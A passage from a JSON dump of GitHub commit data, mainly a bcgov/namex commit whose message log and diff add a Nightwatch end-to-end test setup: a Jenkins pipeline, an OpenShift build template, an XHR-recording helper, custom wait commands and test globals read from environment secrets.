statements\r\nminor cleanup\r\n\r\n* implemented methods for the new parameter pass on code\r\nreasonable cleaning of received paramters\r\nimproved __repr__() and __str__()\r\nwrite warnings to log instead of raising a warning\r\nmake requires_credentials() an instance method\r\n\r\n* moved projectQ plugin to new location to prepare putting it in separate module\r\n\r\n* adding license, readme and a few stub files\r\n\r\n* added __init__.py and an example which does not yet work\r\n\r\n* deleted the energy minimization example from openqml_pq\r\n\r\n* started editing the plugin to adopt it the API changes\r\n\r\n* adopted openqml imports in ProjectQ plugin\r\nadded _version.py\r\n\r\n* miving around code\r\n\r\n* new style mapping for gates and observables\r\n\r\n* untangling the parts of the ProjectQ plugin for the different ProjectQ backends\r\n\r\n* moved initialization of engine and reg to __init__()\r\n\r\n* implementing measurement logic\r\n\r\n* moved initialization to reset() to play according to the rules of the new API\r\nfirst version that successfully runs the example\r\n\r\n* added check for user and password in the ibm backend\r\nadded code to example to read user and password from command line\r\n\r\n* implementing measure() for the ibm backend\r\nfixed docstrings\r\n\r\n* allow the use of different optimizers in the example\r\n\r\n* moved conversion from gate names to gates into apply()\r\nadded some default options for testing the ibm backend\r\n\r\n* do not call reset() manually as it is superfluous\r\n\r\n* renamed measure() to expectation()\r\nfixed typo in call to backend.get_probabilities\r\n\r\n* make plugins overwrite execute_queued(), a function returning a value and not directly the user function execute(), which now calls execute_queued() and stores the result in self._out, which is an implementation detail and should be hidden from the user/plugin developer\r\nimplements the first suggestion from #18"}}, "https://github.com/bcgov/namex": {"9f02e2167b84f34a8c4a47702854304e5940dba6": {"url": "https://api.github.com/repos/bcgov/namex/commits/9f02e2167b84f34a8c4a47702854304e5940dba6", "html_url": "https://github.com/bcgov/namex/commit/9f02e2167b84f34a8c4a47702854304e5940dba6", "message": "E2e initial commit (#575)\n\n* Made a separate list of equivalent leading vowel sounds\r\nAdded 'Z' and 'V' to the consonant list\r\nRemoved C <-> G since it was generating too many unexpected results\r\n\r\n* Corrected matching for query/word with leading vowels\r\nRefactored special leading sounds\r\n\r\n* Fixed tests to match new API search divider pattern\r\n\r\n* Added integration_synonym_api decorators\r\nUsed proper pytest skip decorator\r\n\r\n* Initial e2e commit\r\n\r\nSigned-off-by: john_lane <john.a.m.lane@gov.bc.ca>\r\n\r\n* Created jenkinsfile for running nightwatch to run e2e test\r\n\r\n* Changed back to original base image and added nightwatch + chromedriver install steps\r\n\r\n* removed log rotation\r\n\r\n* trying out docker image\r\n\r\n* Added additional braces around node\r\n\r\n* corrected indenting\r\n\r\n* Attempting to use a generic node\r\n\r\n* retrying with docker image post brace correction\r\n\r\n* Added additional attributes to the containerTemplate\r\n\r\n* revised config to match actual chromedriver path\r\n\r\n* add sleep to allow time to rsh to pod\r\n\r\n* fixed path for nightwatch command\r\n\r\n* added config path\r\n\r\n* Update Jenkinsfile\r\n\r\n* Update Jenkinsfile\r\n\r\n* Update Jenkinsfile\r\n\r\n* Create global.js\r\n\r\n* Update Jenkinsfile\r\n\r\n* retry with longer time out\r\n\r\n* added sleep stage\r\n\r\n* corrected paths\r\n\r\n* removed failing test run command\r\n\r\n* removed custom assertions from config\r\n\r\n* trying a proper package.json to help with installs\r\n\r\n* trying lower version of chromium\r\n\r\n* removed path for chromium\r\n\r\n* added true chromium path\r\n\r\n* dockerfile\r\n\r\n* Rename dockerfile.txt to dockerfile\r\n\r\n* build.json for template\r\n\r\n* Rename build.json.txt to build.json\r\n\r\n* Rename dockerfile to Dockerfile\r\n\r\n* added our image path\r\n\r\n* corrected pod label\r\n\r\n* Removed run command to allow remote debug\r\n\r\n* trying a yum in the Dockerfile\r\n\r\n* Update Jenkinsfile\r\n\r\n* Update Jenkinsfile\r\n\r\n* Update Jenkinsfile\r\n\r\n* Update Jenkinsfile\r\n\r\n* Update Jenkinsfile\r\n\r\n* Update Jenkinsfile\r\n\r\n* Update Jenkinsfile\r\n\r\n* Update Jenkinsfile\r\n\r\n* Update Jenkinsfile\r\n\r\n* Update nightwatch.json\r\n\r\n* Update Jenkinsfile\r\n\r\n* Update package.json\r\n\r\n* Update nightwatch.json\r\n\r\n* Update nightwatch.json\r\n\r\n* Update package.json\r\n\r\n* Update Jenkinsfile\r\n\r\n* Update nightwatch.json\r\n\r\n* reconfigured to run geckodriver, removed yum statement from Dockerfile\r\n\r\n* updated image name\r\n\r\n* Update Jenkinsfile\r\n\r\n* Update Jenkinsfile\r\n\r\n* Update nightwatch.json\r\n\r\n* Update Jenkinsfile\r\n\r\n* Update Jenkinsfile\r\n\r\n* Update nightwatch.json\r\n\r\n* Update Jenkinsfile\r\n\r\n* Update Jenkinsfile\r\n\r\n* Update nightwatch.json\r\n\r\n* Update nightwatch.json\r\n\r\n* Update nightwatch.json\r\n\r\n* Update nightwatch.json\r\n\r\n* Update nightwatch.json\r\n\r\n* Update nightwatch.json\r\n\r\n* Update Jenkinsfile\r\n\r\n* post delete\r\n\r\nSigned-off-by: john_lane <john.a.m.lane@gov.bc.ca>\r\n\r\n* refactor nightwatch.json\r\n\r\n* Update Dockerfile\r\n\r\n* Update Jenkinsfile\r\n\r\n* added firefox install to Dockerfile\r\n\r\n* trying new base iamge\r\n\r\n* building new image based on BDDStack\r\n\r\n* Update Jenkinsfile\r\n\r\n* Replacing our custom image with the BDDStack Jenkins Slave\r\n\r\n* slight adjustment to config path\r\n\r\n* Update Jenkinsfile\r\n\r\n* Update Jenkinsfile\r\n\r\n* Update nightwatch.json\r\n\r\n* Update Jenkinsfile\r\n\r\n* Update Jenkinsfile\r\n\r\n* Update Jenkinsfile\r\n\r\n* Update nightwatch.json\r\n\r\n* Update nightwatch.json\r\n\r\n* Update nightwatch.json\r\n\r\n* Update nightwatch.json\r\n\r\n* Update nightwatch.json\r\n\r\n* Update nightwatch.json\r\n\r\n* Update nightwatch.json\r\n\r\n* Update nightwatch.json\r\n\r\n* Update nightwatch.json\r\n\r\n* Update nightwatch.json\r\n\r\n* Update nightwatch.json\r\n\r\n* Update package.json\r\n\r\n* Update package.json\r\n\r\n* Update nightwatch.json\r\n\r\n* Update nightwatch.json\r\n\r\n* Update nightwatch.json\r\n\r\n* Update package.json\r\n\r\n* Update package.json\r\n\r\n* Modified the BDDStack image to include the latest firefox binary\r\n\r\n* Jenkinsfile updated to use our image.\r\n\r\n* Reverting to base BDDStack Jenkins slave image\r\n\r\n* adding in the revised nightwatch config - switching to Chrome\r\n\r\n* update chromedriver port\r\n\r\n* downgrade chromedriver version\r\n\r\n* Added more args to chrome config\r\n\r\n* added secret for login info\r\n\r\n* added test run and removed sleep\r\n\r\n* corrected typo in globals\r\n\r\n* added logging to confirm globals\r\n\r\n* Refactored NRO login screen to accomodate changes\r\n\r\n* Update nightwatch.json\r\n\r\n* Update nightwatch.json\r\n\r\n* Update nightwatch.json\r\n\r\n* resolving conflicts\r\n\r\n* Added back sleep stage to allow debug time\r\n\r\n* testing the globals\r\n\r\n* added more wait time\r\n\r\n* removing headless flag and reducing wait time\r\n\r\n* adding back headless flag\r\n\r\n* testing basic URL\r\n\r\n* added new chromeOption to address redirects\r\n\r\n* Added back real URL for redirect test\r\n\r\n* added new arg to webdriver config instead of chrome\r\n\r\n* Trying newer image\r\n\r\n* increment chromedriver version to 2.46\r\n\r\n* hardcoding the redirect URL as a test\r\n\r\n* trying out intermediate click on 302 screen\r\n\r\n* refactored test script for debugging\r\n\r\n* added callback to print title\r\n\r\n* adding user-agent arg to ChromeOptions\r\n\r\n* new logging statement in the test. removed test execution\r\n\r\n* refactored NRO steps to use public page\r\n\r\n* refactored script to use anon flow and keycloak logins\r\n\r\n* Added wait to search page\r\n\r\n* trying Chrome 74 useragent for keycloak redirect\r\n\r\n* refactored script to use auth API\r\n\r\n* small edit to landing page object\r\n\r\n* added missing custom command\r\n\r\n* refactor namex login test\r\n\r\n* another login test\r\n\r\n* login debug\r\n\r\n* new cookie name\r\n\r\n* added other missing custom command\r\n\r\n* Update nightwatch.json\r\n\r\n* Update Jenkinsfile\r\n\r\n* Update Jenkinsfile\r\n\r\n* Update Jenkinsfile\r\n\r\n* remove run command and refactor configs.\r\n\r\n* changed nightwatch version to latest stable\r\n\r\n* Added some waits to firm up the search tests\r\n\r\n* added wait to ensure spinner isn't showing\r\n\r\n* corrected NRO checks\r\n\r\n* Max wait time is now 6 minutes\r\n\r\n* expanded global wait time to 10 seconds (max)\r\n\r\n* updated Jenkinsfile to run tests\r\n\r\n* removed sleep step from Jenkinsfile\r\n\r\n* Firm up steps prior to waiting for updater\r\n\r\n* changed assertions to value instead of text\r\n\r\n* refactored to avoid buggy .clearValue function\r\n\r\n* corrected incorrect addressing of element within page object\r\n\r\n* stopped using the page object within perform\r\n\r\n* changed comparison logic in search page object\r\n\r\n* changed to getValue for NR column\r\n\r\n* Final commit, ready for code review. removed Dockerfile that we are no longer using.\r\n\r\nSigned-off-by: john_lane <john.a.m.lane@gov.bc.ca>\r\n\r\n* Adding back cookie code that was still being used.\r\n\r\n* Revert \"Made a separate list of equivalent leading vowel sounds\"\r\n\r\nThis reverts commit 47009e961bf61ee89678427193bb35fd3bb1e95c.\r\n\r\n* revert commit for pytests", "sha": "9f02e2167b84f34a8c4a47702854304e5940dba6", "keyword": "remote code execution correct", "diff": "diff --git a/api/tests/python/end_points/test_sounds_like.py b/api/tests/python/end_points/test_sounds_like.py\nindex a30269a5..30a0de5d 100644\n--- a/api/tests/python/end_points/test_sounds_like.py\n+++ b/api/tests/python/end_points/test_sounds_like.py\n@@ -866,4 +866,4 @@ def test_query_stripped_to_empty_string(solr,client, jwt, query):\n     verify_results(client, jwt,\n         query=query,\n         expected=[{'name':'----*'}]\n-    )\n+    )\n\\ No newline at end of file\ndiff --git a/e2e/Jenkinsfile b/e2e/Jenkinsfile\nnew file mode 100644\nindex 00000000..3b59ef63\n--- /dev/null\n+++ b/e2e/Jenkinsfile\n@@ -0,0 +1,67 @@\n+#!/usr/bin/env groovy\n+// Copyright \u00a9 2018 Province of British Columbia\n+//\n+// Licensed under the Apache License, Version 2.0 (the \"License\");\n+// you may not use this file except in compliance with the License.\n+// You may obtain a copy of the License at\n+//\n+// http://www.apache.org/licenses/LICENSE-2.0\n+//\n+// Unless required by applicable law or agreed to in writing, software\n+// distributed under the License is distributed on an \"AS IS\" BASIS,\n+// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n+// See the License for the specific language governing permissions and\n+// limitations under the License.\n+\n+\n+// define groovy functions\n+import groovy.json.JsonOutput\n+\n+// pipeline\n+\n+//node/pod needs environment setup for testing\n+    def e2e_label = \"e2e-image${UUID.randomUUID().toString()}\"\n+    podTemplate(label: e2e_label, name: e2e_label, serviceAccount: 'jenkins', cloud: 'openshift', containers: [\n+        containerTemplate(\n+            name: 'jnlp',\n+            image: 'docker-registry.default.svc:5000/bcgov/jenkins-slave-bddstack:latest',\n+            resourceRequestCpu: '500m',\n+            resourceLimitCpu: '1000m',\n+            resourceRequestMemory: '1Gi',\n+            resourceLimitMemory: '4Gi',\n+            workingDir: '',\n+            command: '',\n+            args: '${computer.jnlpmac} ${computer.name}',\n+            envVars: [\n+                secretEnvVar(key: 'IDIRCredU', secretName: 'e2e-secrets', secretKey: 'IDIRCredU'),\n+                secretEnvVar(key: 'IDIRCredP', secretName: 'e2e-secrets', secretKey: 'IDIRCredP'),\n+                secretEnvVar(key: 'KeycloakCredU', secretName: 'e2e-secrets', secretKey: 'KeycloakCredU'),\n+                secretEnvVar(key: 'KeycloakCredP', secretName: 'e2e-secrets', secretKey: 'KeycloakCredP'),                \n+                secretEnvVar(key: 'keycloakAuthURL', secretName: 'e2e-secrets', secretKey: 'keycloakAuthURL'),\n+                secretEnvVar(key: 'keycloakAuthBody', secretName: 'e2e-secrets', secretKey: 'keycloakAuthBody'),                \n+                secretEnvVar(key: 'TestCC', secretName: 'e2e-secrets', secretKey: 'TestCC'),\n+                secretEnvVar(key: 'TestCVD', secretName: 'e2e-secrets', secretKey: 'TestCVD')\n+            ]\n+        )\n+    ])\n+    {    \n+        node (e2e_label) {\n+        \n+            stage('Checkout') {\n+                \n+                    echo \"checking out source\"\n+                    echo \"Build: ${BUILD_ID}\"\n+                    checkout scm              \n+            }\n+\n+            stage ('Running e2e Tests') {\n+                echo \"Running tests \"\n+                \n+                    sh '''\n+                         cd e2e\n+                         npm install\n+                         npm run test\n+                    '''\n+            }\n+    }\n+}\ndiff --git a/e2e/build.json b/e2e/build.json\nnew file mode 100644\nindex 00000000..49ac6097\n--- /dev/null\n+++ b/e2e/build.json\n@@ -0,0 +1,139 @@\n+{\r\n+\t\"kind\": \"Template\",\r\n+\t\"apiVersion\": \"v1\",\r\n+\t\"metadata\": {\r\n+\t\t\"name\": \"${NAME}-build-template\",\r\n+\t\t\"labels\": {\r\n+\t\t\t\"application\": \"${NAME}\"\r\n+\t\t}\r\n+\t},\r\n+\t\"objects\": [{\r\n+\t\t\t\"kind\": \"ImageStream\",\r\n+\t\t\t\"apiVersion\": \"v1\",\r\n+\t\t\t\"metadata\": {\r\n+\t\t\t\t\"name\": \"${NAME}\"\r\n+\t\t\t}\r\n+\t\t},\r\n+\t\t{\r\n+\t\t\t\"kind\": \"BuildConfig\",\r\n+\t\t\t\"apiVersion\": \"v1\",\r\n+\t\t\t\"metadata\": {\r\n+\t\t\t\t\"name\": \"${NAME}\",\r\n+\t\t\t\t\"creationTimestamp\": null,\r\n+\t\t\t\t\"labels\": {\r\n+\t\t\t\t\t\"app\": \"${NAME}\"\r\n+\t\t\t\t}\r\n+\t\t\t},\r\n+\t\t\t\"spec\": {\r\n+\t\t\t\t\"runPolicy\": \"Serial\",\r\n+\t\t\t\t\"source\": {\r\n+\t\t\t\t\t\"type\": \"Git\",\r\n+\t\t\t\t\t\"git\": {\r\n+\t\t\t\t\t\t\"ref\": \"${GIT_REF}\",\r\n+\t\t\t\t\t\t\"uri\": \"${GIT_REPO_URL}\"\r\n+\t\t\t\t\t},\r\n+\t\t\t\t\t\"contextDir\": \"${SOURCE_CONTEXT_DIR}\"\r\n+\t\t\t\t},\r\n+\t\t\t\t\"strategy\": {\r\n+\t\t\t\t\t\"type\": \"Docker\",\r\n+\t\t\t\t\t\"dockerStrategy\": {\r\n+\t\t\t\t\t\t\"dockerfilePath\": \"${DOCKER_FILE_PATH}\"\r\n+\t\t\t\t\t}\r\n+\t\t\t\t},\r\n+\t\t\t\t\"output\": {\r\n+\t\t\t\t\t\"to\": {\r\n+\t\t\t\t\t\t\"kind\": \"ImageStreamTag\",\r\n+\t\t\t\t\t\t\"name\": \"${NAME}:${OUTPUT_IMAGE_TAG}\"\r\n+\t\t\t\t\t}\r\n+\t\t\t\t},\r\n+\t\t\t\t\"resources\": {\r\n+\t\t\t\t\t\"requests\": {\r\n+\t\t\t\t\t\t\"cpu\": \"${CPU_REQUEST}\",\r\n+\t\t\t\t\t\t\"memory\": \"${MEMORY_REQUEST}\"\r\n+\t\t\t\t\t},\r\n+\t\t\t\t\t\"limits\": {\r\n+\t\t\t\t\t\t\"cpu\": \"${CPU_LIMIT}\",\r\n+\t\t\t\t\t\t\"memory\": \"${MEMORY_LIMIT}\"\r\n+\t\t\t\t\t}\r\n+\t\t\t\t},\r\n+\t\t\t\t\"triggers\": [{\r\n+\t\t\t\t\t\t\"type\": \"ImageChange\"\r\n+\t\t\t\t\t},\r\n+\t\t\t\t\t{\r\n+\t\t\t\t\t\t\"type\": \"ConfigChange\"\r\n+\t\t\t\t\t}\r\n+\t\t\t\t]\r\n+\t\t\t}\r\n+\t\t}\r\n+\t],\r\n+\t\"parameters\": [{\r\n+\t\t\t\"name\": \"NAME\",\r\n+\t\t\t\"displayName\": \"Name\",\r\n+\t\t\t\"description\": \"The name assigned to all of the frontend objects defined in this template.  You should keep this as default unless your know what your doing.\",\r\n+\t\t\t\"required\": true\r\n+\t\t},\r\n+\t\t{\r\n+\t\t\t\"name\": \"GIT_REPO_URL\",\r\n+\t\t\t\"displayName\": \"Git Repo URL\",\r\n+\t\t\t\"description\": \"The URL to your GIT repo, don't use the this default unless your just experimenting.\",\r\n+\t\t\t\"required\": true,\r\n+\t\t\t\"value\": \"https://github.com/BCDevOps/openshift-components.git\"\r\n+\t\t},\r\n+\t\t{\r\n+\t\t\t\"name\": \"GIT_REF\",\r\n+\t\t\t\"displayName\": \"Git Reference\",\r\n+\t\t\t\"description\": \"The git reference or branch.\",\r\n+\t\t\t\"required\": true,\r\n+\t\t\t\"value\": \"master\"\r\n+\t\t},\r\n+\t\t{\r\n+\t\t\t\"name\": \"SOURCE_CONTEXT_DIR\",\r\n+\t\t\t\"displayName\": \"Source Context Directory\",\r\n+\t\t\t\"description\": \"The source context directory.\",\r\n+\t\t\t\"required\": true,\r\n+\t\t\t\"value\": \"openshift/docker\"\r\n+\t\t},\r\n+\t\t{\r\n+\t\t\t\"name\": \"OUTPUT_IMAGE_TAG\",\r\n+\t\t\t\"displayName\": \"Output Image Tag\",\r\n+\t\t\t\"description\": \"The tag given to the built image.\",\r\n+\t\t\t\"required\": true,\r\n+\t\t\t\"value\": \"latest\"\r\n+\t\t},\r\n+\t\t{\r\n+\t\t\t\"name\": \"DOCKER_FILE_PATH\",\r\n+\t\t\t\"displayName\": \"Docker File Path\",\r\n+\t\t\t\"description\": \"The path to the docker file.\",\r\n+\t\t\t\"required\": true,\r\n+\t\t\t\"value\": \"Dockerfile\"\r\n+\t\t},\r\n+\t\t{\r\n+\t\t\t\"name\": \"CPU_LIMIT\",\r\n+\t\t\t\"displayName\": \"Resources CPU Limit\",\r\n+\t\t\t\"description\": \"The resources CPU limit (in cores) for this build.\",\r\n+\t\t\t\"required\": true,\r\n+\t\t\t\"value\": \"2\"\r\n+\t\t},\r\n+\t\t{\r\n+\t\t\t\"name\": \"MEMORY_LIMIT\",\r\n+\t\t\t\"displayName\": \"Resources Memory Limit\",\r\n+\t\t\t\"description\": \"The resources Memory limit (in Mi, Gi, etc) for this build.\",\r\n+\t\t\t\"required\": true,\r\n+\t\t\t\"value\": \"4Gi\"\r\n+\t\t},\r\n+\t\t{\r\n+\t\t\t\"name\": \"CPU_REQUEST\",\r\n+\t\t\t\"displayName\": \"Resources CPU Request\",\r\n+\t\t\t\"description\": \"The resources CPU request (in cores) for this build.\",\r\n+\t\t\t\"required\": true,\r\n+\t\t\t\"value\": \"1\"\r\n+\t\t},\r\n+\t\t{\r\n+\t\t\t\"name\": \"MEMORY_REQUEST\",\r\n+\t\t\t\"displayName\": \"Resources Memory Request\",\r\n+\t\t\t\"description\": \"The resources Memory request (in Mi, Gi, etc) for this build.\",\r\n+\t\t\t\"required\": true,\r\n+\t\t\t\"value\": \"2Gi\"\r\n+\t\t}\r\n+\t]\r\n+}\r\ndiff --git a/e2e/client.js b/e2e/client.js\nnew file mode 100644\nindex 00000000..74f34e09\n--- /dev/null\n+++ b/e2e/client.js\n@@ -0,0 +1,59 @@\n+'use strict';\n+\n+Object.defineProperty(exports, \"__esModule\", {\n+    value: true\n+});\n+var clientListen = exports.clientListen = function clientListen() {\n+    var getXhr = function getXhr(id) {\n+        return window.xhrListen.find(function (xhr) {\n+            return xhr.id === id;\n+        });\n+    };\n+    var rand = function rand() {\n+        return Math.random() * 16 | 0;\n+    };\n+    var uuidV4 = function uuidV4() {\n+        return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function (c) {\n+            return (c === 'x' ? rand() : rand() & 0x3 | 0x8).toString(16);\n+        });\n+    };\n+\n+    window.xhrListen = [];\n+\n+    if (!XMLHttpRequest.customized) {\n+        XMLHttpRequest.realSend = XMLHttpRequest.prototype.send;\n+        XMLHttpRequest.realOpen = XMLHttpRequest.prototype.open;\n+\n+        XMLHttpRequest.prototype.open = function (method, url) {\n+            this.id = uuidV4();\n+            window.xhrListen.push({\n+                id: this.id,\n+                method: method,\n+                url: url,\n+                openedTime: Date.now()\n+            });\n+            this.onload = function () {\n+                if (this.readyState === XMLHttpRequest.DONE) {\n+                    var xhr = getXhr(this.id);\n+                    if (xhr) {\n+                        xhr.httpResponseCode = this.status;\n+                        xhr.responseData = this.responseText;\n+                        xhr.status = this.status === 200 ? 'success' : 'error';\n+                    }\n+                }\n+            };\n+            XMLHttpRequest.realOpen.apply(this, arguments);\n+        };\n+        XMLHttpRequest.prototype.send = function (data) {\n+            var xhr = getXhr(this.id);\n+            if (xhr) xhr.requestData = data;\n+\n+            XMLHttpRequest.realSend.apply(this, arguments);\n+        };\n+        XMLHttpRequest.customized = true;\n+    }\n+};\n+\n+var clientPoll = exports.clientPoll = function clientPoll() {\n+    return window.xhrListen || [];\n+};\n\\ No newline at end of file\ndiff --git a/e2e/custom-commands/apiPost.js b/e2e/custom-commands/apiPost.js\nnew file mode 100644\nindex 00000000..f808ccc2\n--- /dev/null\n+++ b/e2e/custom-commands/apiPost.js\n@@ -0,0 +1,31 @@\n+var util = require('util');\r\n+var events = require('events');\r\n+var request = require('request');\r\n+\r\n+function apiPost() {\r\n+    events.EventEmitter.call(this);\r\n+}\r\n+\r\n+util.inherits(apiPost, events.EventEmitter);\r\n+\r\n+apiPost.prototype.command = function (options, callback) {\r\n+    var self = this;\r\n+    this.api.perform(function () {\r\n+        setTimeout(function () {\r\n+\r\n+        request(options, function (error, response) {\r\n+            if (error) {\r\n+                console.error(error);\r\n+                return;\r\n+            }\r\n+            if (callback) {\r\n+                callback(response);\r\n+            }\r\n+        });\r\n+            self.emit('complete');\r\n+        }, 10);\r\n+    });\r\n+    return this;\r\n+};\r\n+\r\n+module.exports = apiPost;\n\\ No newline at end of file\ndiff --git a/e2e/custom-commands/waitForAttribute.js b/e2e/custom-commands/waitForAttribute.js\nnew file mode 100644\nindex 00000000..8733873b\n--- /dev/null\n+++ b/e2e/custom-commands/waitForAttribute.js\n@@ -0,0 +1,57 @@\n+var util = require('util');\r\n+var events = require('events');\r\n+var assert = require('assert');\r\n+\r\n+/*\r\n+ * This custom command allows us to locate an HTML element on the page and then wait until the value of the element's\r\n+ * inner text (the text between the opening and closing tags) matches the provided expression (aka. the 'checker' function).\r\n+ * It retries executing the checker function every 100ms until either it evaluates to true or it reaches\r\n+ * maxTimeInMilliseconds (which fails the test).\r\n+ * Nightwatch uses the Node.js EventEmitter pattern to handle asynchronous code so this command is also an EventEmitter.\r\n+ */\r\n+\r\n+function WaitForAttribute() {\r\n+    events.EventEmitter.call(this);\r\n+    this.startTimeInMilliseconds = null;\r\n+}\r\n+\r\n+util.inherits(WaitForAttribute, events.EventEmitter, assert);\r\n+\r\n+WaitForAttribute.prototype.command = function (element, attribute, checker, timeoutInMilliseconds) {\r\n+    this.startTimeInMilliseconds = new Date().getTime();\r\n+    var self = this;\r\n+    var message;\r\n+\r\n+\r\n+    this.check(element, attribute, checker, function (result, loadedTimeInMilliseconds) {\r\n+        if (result) {\r\n+            message = 'waitForAttribute: ' + element + '. Expression was true after ' + (loadedTimeInMilliseconds - self.startTimeInMilliseconds) + ' ms.';\r\n+        } else {\r\n+            message = 'waitForAttribute: ' + element + '. Expression wasn\\'t true in ' + timeoutInMilliseconds + ' ms.';\r\n+        }\r\n+\r\n+        assert(result, message);\r\n+        self.emit('complete');\r\n+    }, timeoutInMilliseconds);\r\n+\r\n+    return this;\r\n+};\r\n+\r\n+WaitForAttribute.prototype.check = function (element, attribute, checker, callback, maxTimeInMilliseconds) {\r\n+    var self = this;\r\n+    this.api.keys(this.api.Keys.ENTER);\r\n+    this.api.getAttribute(element, attribute, function (result) {\r\n+        var now = new Date().getTime();\r\n+        if (result.status === 0 && checker(result.value)) {\r\n+            callback(true, now);\r\n+        } else if (now - self.startTimeInMilliseconds < maxTimeInMilliseconds) {\r\n+            setTimeout(function () {\r\n+                self.check(element, attribute, checker, callback, maxTimeInMilliseconds);\r\n+            }, 1000);\r\n+        } else {\r\n+            callback(false);\r\n+        }\r\n+    });\r\n+};\r\n+\r\n+module.exports = WaitForAttribute;\n\\ No newline at end of file\ndiff --git a/e2e/custom-commands/waitForText.js b/e2e/custom-commands/waitForText.js\nnew file mode 100644\nindex 00000000..f6cc1c16\n--- /dev/null\n+++ b/e2e/custom-commands/waitForText.js\n@@ -0,0 +1,57 @@\n+var util = require('util');\r\n+var events = require('events');\r\n+var assert = require('assert');\r\n+\r\n+/*\r\n+ * This custom command allows us to locate an HTML element on the page and then wait until the value of the element's\r\n+ * inner text (the text between the opening and closing tags) matches the provided expression (aka. the 'checker' function).\r\n+ * It retries executing the checker function every 100ms until either it evaluates to true or it reaches\r\n+ * maxTimeInMilliseconds (which fails the test).\r\n+ * Nightwatch uses the Node.js EventEmitter pattern to handle asynchronous code so this command is also an EventEmitter.\r\n+ */\r\n+\r\n+function WaitForText() {\r\n+    events.EventEmitter.call(this);\r\n+    this.startTimeInMilliseconds = null;\r\n+}\r\n+\r\n+util.inherits(WaitForText, events.EventEmitter, assert);\r\n+\r\n+WaitForText.prototype.command = function (element, checker, timeoutInMilliseconds) {\r\n+    this.startTimeInMilliseconds = new Date().getTime();\r\n+    var self = this;\r\n+    var message;\r\n+\r\n+\r\n+    this.check(element, checker, function (result, loadedTimeInMilliseconds) {\r\n+        if (result) {\r\n+            message = 'waitForText: ' + element + '. Expression was true after ' + (loadedTimeInMilliseconds - self.startTimeInMilliseconds) + ' ms.';\r\n+        } else {\r\n+            message = 'waitForText: ' + element + '. Expression wasn\\'t true in ' + timeoutInMilliseconds + ' ms.';\r\n+        }\r\n+\r\n+        assert(result, message);\r\n+        self.emit('complete');\r\n+    }, timeoutInMilliseconds);\r\n+\r\n+    return this;\r\n+};\r\n+\r\n+WaitForText.prototype.check = function (element, checker, callback, maxTimeInMilliseconds) {\r\n+    var self = this;\r\n+    this.api.keys(this.api.Keys.ENTER);\r\n+    this.api.getText(element, function (result) {\r\n+        var now = new Date().getTime();\r\n+        if (result.status === 0 && checker(result.value)) {\r\n+            callback(true, now);\r\n+        } else if (now - self.startTimeInMilliseconds < maxTimeInMilliseconds) {\r\n+            setTimeout(function () {\r\n+                self.check(element, checker, callback, maxTimeInMilliseconds);\r\n+            }, 1000);\r\n+        } else {\r\n+            callback(false);\r\n+        }\r\n+    });\r\n+};\r\n+\r\n+module.exports = WaitForText;\n\\ No newline at end of file\ndiff --git a/e2e/custom-commands/waitForXHR.js b/e2e/custom-commands/waitForXHR.js\nnew file mode 100644\nindex 00000000..0bdb307a\n--- /dev/null\n+++ b/e2e/custom-commands/waitForXHR.js\n@@ -0,0 +1,66 @@\n+'use strict';\n+\n+var _client = require('../client');\n+\n+var util = require('util');\n+\n+var events = require('events');\n+\n+function WaitForXHR() {\n+    // $FlowFixMe\n+    events.EventEmitter.call(this);\n+}\n+\n+util.inherits(WaitForXHR, events.EventEmitter);\n+\n+WaitForXHR.prototype.command = function () {\n+    var urlPattern = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : '';\n+    var delay = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : 1000;\n+    var trigger = arguments.length > 2 && arguments[2] !== undefined ? arguments[2] : function () {};\n+    var callback = arguments.length > 3 && arguments[3] !== undefined ? arguments[3] : function () {};\n+\n+    var command = this;\n+    var api = this.api;\n+\n+    this.callback = callback;\n+    this.urlPattern = urlPattern;\n+\n+    // console.log('Verifying request ...');\n+    if (typeof urlPattern === 'string') {\n+        // throw new Error('urlPattern should be empty, string or regular expression');\n+    }\n+    if (typeof trigger !== 'function') {\n+        throw new Error('trigger should be a function');\n+    }\n+    if (typeof callback !== 'function') {\n+        throw new Error('callback should be a function');\n+    }\n+\n+    // console.log('Setting up listening...');\n+    api.execute(_client.clientListen, [], function (res) {\n+        // console.warn('Listening XHR requests');\n+    });\n+\n+    // console.log('Setting up timeout...');\n+    this.timeout = setTimeout(function () {\n+        command.api.execute(_client.clientPoll, [], function (_ref) {\n+            var xhrs = _ref.value;\n+\n+            //console.log('xhrss', xhrs);\n+            var matchingXhrs = xhrs ? xhrs.filter(function (xhr) {\n+                return xhr.url.match(command.urlPattern);\n+            }) : [];\n+            if (matchingXhrs) command.callback(matchingXhrs);else command.client.assertion(false, 'Nothing heard', 'XHR Request', 'No XHR opened with pattern ' + urlPattern + ' !');\n+            command.emit('complete');\n+        });\n+    }, delay);\n+\n+    // console.log('Handling trigger ...');\n+    if (trigger) {\n+        if (typeof trigger === \"function\") trigger();else if (typeof trigger === \"string\") api.click(trigger);\n+    }\n+    // console.log('Done');\n+    return this;\n+};\n+\n+module.exports = WaitForXHR;\n\\ No newline at end of file\ndiff --git a/e2e/globals.js b/e2e/globals.js\nnew file mode 100644\nindex 00000000..f2067af7\n--- /dev/null\n+++ b/e2e/globals.js\n@@ -0,0 +1,42 @@\n+module.exports = {\r\n+\twaitForConditionTimeout : 10000,\r\n+\t\r\n+\tthrowOnMultipleElementsReturned : true,\r\n+\t\r\n+    smokeTestNR: {\r\n+        NR_num: '',\r\n+        name_choice1: 'ZZZZZZZ 1 TEST NAME DO NOT EXAMINE'\r\n+    },\r\n+\t\r\n+    searchScreenTopHold:{\r\n+        NR_num: ''\r\n+    },\r\n+\r\n+    IDIRCredU : process.env.IDIRCredU,\r\n+\r\n+    IDIRCredP : process.env.IDIRCredP,\r\n+\r\n+    KeycloakCredP : process.env.KeycloakCredP,\r\n+\r\n+    KeycloakCredU : process.env.KeycloakCredU,\r\n+\r\n+    TestCC : process.env.TestCC,\r\n+\r\n+    TestCVD : process.env.TestCVD,\r\n+\r\n+    keycloakAuthURL : process.env.keycloakAuthURL,\r\n+\r\n+    keycloakAuthBody : process.env.keycloakAuthBody,\r\n+\r\n+    token : '',\r\n+\r\n+    extractorTimeOut : 1000,\r\n+\r\n+    exactMatch : 'AIR PACIFIC LIMITED',\r\n+\r\n+    conditionExample : 'INSURANCE',\r\n+\r\n+    trademarkResult : 'Litigation Life Benefit 